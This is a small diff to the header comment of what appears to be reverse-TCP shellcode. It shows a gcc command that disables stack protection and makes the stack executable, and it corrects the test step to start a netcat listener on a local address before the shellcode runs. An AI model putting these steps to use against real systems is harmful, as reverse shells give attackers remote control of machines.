@@ -45,7 +45,7 @@
  # gcc -m32 -fno-stack-protector -z execstack tiny_shell_reverse_tcp_shellcode.c -o tiny_shell_reverse_tcp_shellcode
 
  Testing
- # nc 127.1.1.1 11111
+ # nc -l 127.1.1.1 11111
  # ./tiny_shell_reverse_tcp_shellcode
 
 */
